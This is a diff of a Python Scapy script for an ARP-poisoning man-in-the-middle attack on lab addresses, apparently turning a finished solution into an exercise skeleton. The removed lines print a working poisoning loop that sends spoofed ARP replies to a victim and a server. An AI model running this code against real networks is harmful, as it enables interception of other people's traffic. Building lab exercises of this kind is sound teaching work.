@@ -1,45 +1,20 @@
 from scapy.all import *
 import threading
+import time
 
 conf.debug_match = 0     
 conf.debug_dissector = 0 
 conf.verb = 0            
 
-VICTIM_IP = "10.10.0.20"
-SERVER_IP = "10.10.0.30"
+VICTIM_IP = "10.20.0.20"
+SERVER_IP = "10.20.0.30"
 
 VICTIM_MAC = "00:00:00:00:00:20"
 SERVER_MAC = "00:00:00:00:00:30"
 
 def arp_poison(victim_ip, victim_mac, server_ip, server_mac):
-    # Create ARP packets for poisoning
-    arp_to_victim = (
-        Ether(dst=victim_mac) / 
-        ARP(
-            op=2, 
-            pdst=victim_ip, 
-            psrc=server_ip, 
-            hwsrc=get_if_hwaddr("eth0"),
-            hwdst=victim_mac
-        )
-    )
-    
-    arp_to_server = (
-        Ether(dst=server_mac) / 
-        ARP(
-            op=2, 
-            pdst=server_ip, 
-            psrc=victim_ip, 
-            hwsrc=get_if_hwaddr("eth0"),
-            hwdst=server_mac
-        )
-    )
-
-    # Send the ARP packets in a loop
-    while True:
-        sendp(arp_to_victim)
-        sendp(arp_to_server)
-        time.sleep(2)  # Wait for 2 seconds before sending again
+    #TODO: Implement ARP poisoning logic here
+    pass
 
 def packet_callback(packet):
     if packet.haslayer(Raw):
